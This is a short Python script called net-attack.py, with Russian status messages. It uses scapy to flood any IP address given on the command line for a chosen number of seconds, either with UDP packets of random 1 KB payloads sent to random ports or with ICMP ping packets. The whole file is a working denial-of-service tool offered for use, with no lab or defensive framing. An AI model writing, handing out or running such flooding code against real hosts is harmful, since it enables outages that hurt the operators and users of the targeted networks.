import sys
import time
import random
from scapy.all import IP, UDP, ICMP, send

def run_udp_flood(target_ip, duration):
    end_time = time.time() + duration
    print(f"[*] Запуск UDP-флуда (L4) на {target_ip}...")
    while time.time() < end_time:
        port = random.randint(1, 65535)
        payload = bytes([random.randint(0, 255) for _ in range(1024)])
        packet = IP(dst=target_ip) / UDP(dport=port) / payload
        try:
            send(packet, verbose=False)
        except Exception:
            pass

def run_icmp_flood(target_ip, duration):
    end_time = time.time() + duration
    print(f"[*] Запуск ICMP / Ping-флуда (L3) на {target_ip}...")
    while time.time() < end_time:
        packet = IP(dst=target_ip) / ICMP()
        try:
            send(packet, verbose=False)
        except Exception:
            pass

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Использование: python net-attack.py <type> <ip> <duration_seconds>")
        sys.exit(1)
        
    attack_type = sys.argv[1].upper()
    target = sys.argv[2]
    duration = int(sys.argv[3])
    
    if attack_type == "UDP":
        run_udp_flood(target, duration)
    elif attack_type == "ICMP":
        run_icmp_flood(target, duration)
    else:
        print(f"[!] Неизвестный тип атаки: {attack_type}")